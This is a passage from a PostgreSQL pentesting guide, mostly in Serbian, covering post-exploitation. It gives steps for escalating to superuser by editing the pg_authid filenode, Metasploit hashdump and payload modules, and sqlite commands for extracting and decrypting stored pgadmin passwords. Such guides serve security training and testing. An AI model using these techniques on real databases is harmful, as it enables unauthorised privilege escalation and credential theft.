The attack steps are:

1. Dobijte PostgreSQL data directory
2. Nabavite relativnu putanju do filenode-a povezanog sa tabelom `pg_authid`
3. Preuzmite filenode preko `lo_*` funkcija
4. Dobijte datatype povezan sa tabelom `pg_authid`
5. Koristite [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) da [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); podesite sve `rol*` boolean zastavice na 1 za pune permisije.
6. Ponovo otpremite izmenjeni filenode preko `lo_*` funkcija i prepišite originalni fajl na disku
7. _(Opcionalno)_ Očistite in-memory cache tabela pokretanjem skupog SQL upita
8. Sada biste trebali imati privilegije punog superadmina.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logovanje

U fajlu _**postgresql.conf**_ možete omogućiti postgresql logs menjanjem:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Zatim, **ponovo pokrenite servis**.

### pgadmin

[pgadmin](https://www.pgadmin.org) je platforma za administraciju i razvoj za PostgreSQL.\
Možete pronaći **passwords** unutar _**pgadmin4.db**_ fajla\
Možete ih dešifrovati koristeći _**decrypt**_ funkciju unutar skripte: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Autentifikacija klijenata u PostgreSQL-u se upravlja kroz konfiguracioni fajl nazvan **pg_hba.conf**. Ovaj fajl sadrži niz zapisa, pri čemu svaki specificira tip veze, opseg IP adresa klijenta (ako je primenljivo), ime baze podataka, korisničko ime i metod autentifikacije koji se koristi za podudaranje konekcija. Prvi zapis koji se poklapa po tipu veze, adresi klijenta, traženoj bazi podataka i korisničkom imenu se koristi za autentifikaciju. Ne postoji rezervna opcija ili fallback ako autentifikacija ne uspe. Ako se nijedan zapis ne poklapa, pristup se odbija.

The available password-based authentication methods in pg_hba.conf are **md5**, **crypt**, and **password**. These methods differ in how the password is transmitted: MD5-hashed, crypt-encrypted, or clear-text. It's important to note that the crypt method cannot be used with passwords that have been encrypted in pg_authid.

## References

- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
